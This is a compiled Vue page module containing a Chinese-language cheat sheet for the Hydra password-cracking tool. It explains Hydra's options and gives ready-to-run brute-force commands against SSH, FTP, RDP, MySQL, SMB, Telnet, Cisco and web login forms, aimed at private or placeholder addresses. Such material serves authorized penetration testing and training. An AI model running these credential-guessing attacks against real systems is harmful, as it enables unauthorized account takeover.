import{_ as a,o as s,c as n,e}from"./app.a667bd71.js";const p={},r=e(`<p>\u652F\u6301\u7684\u534F\u8BAE POP3\uFF0CSMB\uFF0CRDP\uFF0CSSH\uFF0CFTP\uFF0CPOP3\uFF0CTelnet\uFF0CMYSQL.</p><h3 id="\u5E38\u7528\u7684\u53C2\u6570" tabindex="-1"><a class="header-anchor" href="#\u5E38\u7528\u7684\u53C2\u6570" aria-hidden="true">#</a> \u5E38\u7528\u7684\u53C2\u6570</h3><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token parameter variable">-l</span>	\u6307\u5B9A\u5355\u4E2A\u7528\u6237\u540D\uFF0C\u9002\u5408\u5728\u77E5\u9053\u7528\u6237\u540D\u7206\u7834\u7528\u6237\u540D\u5BC6\u7801\u65F6\u4F7F\u7528
<span class="token parameter variable">-L</span>	\u6307\u5B9A\u591A\u4E2A\u7528\u6237\u540D\uFF0C\u53C2\u6570\u503C\u4E3A\u5B58\u50A8\u7528\u6237\u540D\u7684\u6587\u4EF6\u7684\u8DEF\u5F84<span class="token punctuation">(</span>\u5EFA\u8BAE\u4E3A\u7EDD\u5BF9\u8DEF\u5F84<span class="token punctuation">)</span>
<span class="token parameter variable">-p</span>	\u6307\u5B9A\u5355\u4E2A\u5BC6\u7801\uFF0C\u9002\u5408\u5728\u77E5\u9053\u5BC6\u7801\u7206\u7834\u7528\u6237\u540D\u65F6\u4F7F\u7528
<span class="token parameter variable">-P</span>	\u6307\u5B9A\u591A\u4E2A\u5BC6\u7801\uFF0C\u53C2\u6570\u503C\u4E3A\u5B58\u8D2E\u5BC6\u7801\u7684\u6587\u4EF6<span class="token punctuation">(</span>\u901A\u5E38\u79F0\u4E3A\u5B57\u5178<span class="token punctuation">)</span>\u7684\u8DEF\u5F84<span class="token punctuation">(</span>\u5EFA\u8BAE\u4E3A\u7EDD\u5BF9\u8DEF\u5F84<span class="token punctuation">)</span>
<span class="token parameter variable">-C</span>	\u5F53\u7528\u6237\u540D\u548C\u5BC6\u7801\u5B58\u50A8\u5230\u4E00\u4E2A\u6587\u4EF6\u65F6\u4F7F\u7528\u6B64\u53C2\u6570\u3002\u6CE8\u610F\uFF0C\u6587\u4EF6<span class="token punctuation">(</span>\u5B57\u5178<span class="token punctuation">)</span>\u5B58\u50A8\u7684\u683C\u5F0F\u5FC5\u987B\u4E3A <span class="token string">&quot;\u7528\u6237\u540D:\u5BC6\u7801&quot;</span> \u7684\u683C\u5F0F\u3002
<span class="token parameter variable">-M</span>	\u6307\u5B9A\u591A\u4E2A\u653B\u51FB\u76EE\u6807\uFF0C\u6B64\u53C2\u6570\u4E3A\u5B58\u50A8\u653B\u51FB\u76EE\u6807\u7684\u6587\u4EF6\u7684\u8DEF\u5F84<span class="token punctuation">(</span>\u5EFA\u8BAE\u4E3A\u7EDD\u5BF9\u8DEF\u5F84<span class="token punctuation">)</span>\u3002\u6CE8\u610F\uFF1A\u5217\u8868\u6587\u4EF6\u5B58\u50A8\u683C\u5F0F\u5FC5\u987B\u4E3A <span class="token string">&quot;\u5730\u5740:\u7AEF\u53E3&quot;</span>
<span class="token parameter variable">-t</span>	\u6307\u5B9A\u7206\u7834\u65F6\u7684\u4EFB\u52A1\u6570\u91CF<span class="token punctuation">(</span>\u53EF\u4EE5\u7406\u89E3\u4E3A\u7EBF\u7A0B\u6570<span class="token punctuation">)</span>\uFF0C\u9ED8\u8BA4\u4E3A16
<span class="token parameter variable">-s</span>	\u6307\u5B9A\u7AEF\u53E3\uFF0C\u9002\u7528\u4E8E\u653B\u51FB\u76EE\u6807\u7AEF\u53E3\u975E\u9ED8\u8BA4\u7684\u60C5\u51B5\u3002\u4F8B\u5982\uFF1Ahttp\u670D\u52A1\u4F7F\u7528\u975E80\u7AEF\u53E3
<span class="token parameter variable">-S</span>	\u6307\u5B9A\u7206\u7834\u65F6\u4F7F\u7528 SSL \u94FE\u63A5
<span class="token parameter variable">-R</span>	\u7EE7\u7EED\u4ECE\u4E0A\u4E00\u6B21\u7206\u7834\u8FDB\u5EA6\u4E0A\u7EE7\u7EED\u7206\u7834
-v/-V	\u663E\u793A\u7206\u7834\u7684\u8BE6\u7EC6\u4FE1\u606F
<span class="token parameter variable">-f</span>	\u4E00\u4F46\u7206\u7834\u6210\u529F\u4E00\u4E2A\u5C31\u505C\u6B62\u7206\u7834
server	\u4EE3\u8868\u8981\u653B\u51FB\u7684\u76EE\u6807<span class="token punctuation">(</span>\u5355\u4E2A<span class="token punctuation">)</span>\uFF0C\u591A\u4E2A\u76EE\u6807\u65F6\u8BF7\u4F7F\u7528 <span class="token parameter variable">-M</span> \u53C2\u6570
 
<span class="token function">service</span>	\u653B\u51FB\u76EE\u6807\u7684\u670D\u52A1\u7C7B\u578B<span class="token punctuation">(</span>\u53EF\u4EE5\u7406\u89E3\u4E3A\u7206\u7834\u65F6\u4F7F\u7528\u7684\u534F\u8BAE<span class="token punctuation">)</span>\uFF0C
<span class="token comment">#\u4F8B\u5982 http \uFF0C\u5728hydra\u4E2D\uFF0C\u4E0D\u540C\u534F\u8BAE\u4F1A\u4F7F\u7528\u4E0D\u540C\u7684\u6A21\u5757\u6765\u7206\u7834\uFF0Chydra \u7684 http-get \u548C http-post \u6A21\u5757\u5C31\u7528\u6765\u7206\u7834\u57FA\u4E8E get \u548C post \u8BF7\u6C42\u7684\u9875\u9762</span>
OPT	\u7206\u7834\u6A21\u5757\u7684\u989D\u5916\u53C2\u6570\uFF0C\u53EF\u4EE5\u4F7F\u7528 <span class="token parameter variable">-U</span> \u53C2\u6570\u6765\u67E5\u770B\u6A21\u5757\u652F\u6301\u90A3\u4E9B\u53C2\u6570\uFF0C\u4F8B\u5982\u547D\u4EE4\uFF1Ahydra <span class="token parameter variable">-U</span> http-get
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="\u5E38\u7528\u547D\u4EE4" tabindex="-1"><a class="header-anchor" href="#\u5E38\u7528\u547D\u4EE4" aria-hidden="true">#</a> \u5E38\u7528\u547D\u4EE4</h3><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token comment">## ftp\u5BC6\u7801\u7834\u89E3</span>
hydra <span class="token parameter variable">-t</span> <span class="token number">10</span> <span class="token parameter variable">-V</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-l</span> root <span class="token parameter variable">-x</span> <span class="token number">4</span>:6:a ftp://192.168.67.132

<span class="token comment">## SSH\u66B4\u529B\u7834\u89E3</span>
hydra <span class="token parameter variable">-L</span> /data/dic/user.dic <span class="token parameter variable">-P</span> /data/dic/password.dic <span class="token parameter variable">-t</span> <span class="token number">5</span> <span class="token number">192.168</span>.2.235 <span class="token function">ssh</span>

<span class="token comment">## mysql\u66B4\u529B\u7834\u89E3</span>
hydra <span class="token parameter variable">-L</span> /data/dic/user.dic <span class="token parameter variable">-P</span> /data/dic/password.dic <span class="token parameter variable">-t</span> <span class="token number">5</span> <span class="token number">192.168</span>.2.235 mysql

<span class="token comment">## \u8FDC\u7A0B\u684C\u9762\u66B4\u529B\u7834\u89E3</span>
hydra <span class="token parameter variable">-L</span> /data/dic/user.dic <span class="token parameter variable">-P</span> /data/dic/password.dic <span class="token parameter variable">-t</span> <span class="token number">1</span> <span class="token number">192.168</span>.2.57 rdp

<span class="token comment">## \u4F7F\u7528hydra\u7834\u89E3ssh\u7684\u5BC6\u7801</span>
hydra <span class="token parameter variable">-L</span> users.txt <span class="token parameter variable">-P</span> password.txt <span class="token parameter variable">-vV</span> <span class="token parameter variable">-o</span> ssh.log <span class="token parameter variable">-e</span> ns IP <span class="token function">ssh</span>

<span class="token comment">## \u7834\u89E3https\uFF1A</span>
hydra <span class="token parameter variable">-m</span> /index.php <span class="token parameter variable">-l</span> username <span class="token parameter variable">-P</span> pass.txt IP https

<span class="token comment">##\u7834\u89E3teamspeak\uFF1A</span>
hydra <span class="token parameter variable">-l</span> \u7528\u6237\u540D <span class="token parameter variable">-P</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-s</span> \u7AEF\u53E3\u53F7 <span class="token parameter variable">-vV</span> <span class="token function">ip</span> teamspeak

<span class="token comment">## \u7834\u89E3cisco\uFF1A</span>
hydra <span class="token parameter variable">-P</span> pass.txt IP cisco
hydra <span class="token parameter variable">-m</span> cloud <span class="token parameter variable">-P</span> pass.txt <span class="token number">10.36</span>.16.18 cisco-enable

<span class="token comment">## \u7834\u89E3smb\uFF1A</span>
hydra <span class="token parameter variable">-l</span> administrator <span class="token parameter variable">-P</span> pass.txt IP smb

<span class="token comment">## \u7834\u89E3pop3\uFF1A</span>
hydra <span class="token parameter variable">-l</span> muts <span class="token parameter variable">-P</span> pass.txt my.pop3.mail pop3

<span class="token comment">## \u7834\u89E3rdp\uFF1A</span>
hydra IP rdp <span class="token parameter variable">-l</span> administrator <span class="token parameter variable">-P</span> pass.txt <span class="token parameter variable">-V</span>

<span class="token comment">## \u7834\u89E3http-proxy\uFF1A</span>
hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span> pass.txt http-proxy://10.36.16.18

<span class="token comment">## \u7834\u89E3telnet</span>
hydra IP telnet <span class="token parameter variable">-l</span> \u7528\u6237 <span class="token parameter variable">-P</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-t</span> <span class="token number">32</span> <span class="token parameter variable">-s</span> <span class="token number">23</span> <span class="token parameter variable">-e</span> ns <span class="token parameter variable">-f</span> <span class="token parameter variable">-V</span>

<span class="token comment">##\u7834\u89E3ftp\uFF1A</span>
hydra IP <span class="token function">ftp</span> <span class="token parameter variable">-l</span> \u7528\u6237\u540D <span class="token parameter variable">-P</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-t</span> \u7EBF\u7A0B<span class="token punctuation">(</span>\u9ED8\u8BA416<span class="token punctuation">)</span> <span class="token parameter variable">-vV</span>
hydra IP <span class="token function">ftp</span> <span class="token parameter variable">-l</span> \u7528\u6237\u540D <span class="token parameter variable">-P</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-e</span> ns <span class="token parameter variable">-vV</span>

<span class="token comment">##get\u65B9\u5F0F\u63D0\u4EA4\uFF0C\u7834\u89E3web\u767B\u5F55\uFF1A</span>
hydra <span class="token parameter variable">-l</span> \u7528\u6237\u540D <span class="token parameter variable">-p</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-t</span> \u7EBF\u7A0B <span class="token parameter variable">-vV</span> <span class="token parameter variable">-e</span> ns IP http-get /admin/
hydra <span class="token parameter variable">-l</span> \u7528\u6237\u540D <span class="token parameter variable">-p</span> \u5BC6\u7801\u5B57\u5178 <span class="token parameter variable">-t</span> \u7EBF\u7A0B <span class="token parameter variable">-vV</span> <span class="token parameter variable">-e</span> ns <span class="token parameter variable">-f</span> IP http-get /admin/index.php


hydra <span class="token parameter variable">-t</span> <span class="token number">5</span> <span class="token parameter variable">-V</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-l</span> root <span class="token parameter variable">-e</span> ns <span class="token parameter variable">-P</span> common.txt localhost mysql


hydra <span class="token parameter variable">-t</span> <span class="token number">4</span> <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-V</span> <span class="token parameter variable">-P</span> common.txt <span class="token number">192.168</span>.206.1 http-form-post <span class="token string">&quot;/login/log.php:user=^USER^&amp;password=^PASS^:S=success&quot;</span>

hydra <span class="token parameter variable">-t</span> <span class="token number">4</span> <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-V</span> <span class="token parameter variable">-P</span> common.txt <span class="token number">192.168</span>.206.1 http-form-post <span class="token string">&quot;/login/log.php:user=^USER^&amp;password=^PASS^:S=success&quot;</span>

hydra <span class="token parameter variable">-t</span> <span class="token number">4</span> <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-V</span> <span class="token parameter variable">-P</span> common.txt <span class="token number">192.168</span>.206.1 http-form-post <span class="token string">&quot;/login/log.php:user=^USER^&amp;password=^PASS^:fail&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),t=[r];function l(i,c){return s(),n("div",null,t)}const m=a(p,[["render",l],["__file","hydra.html.vue"]]);export{m as default};
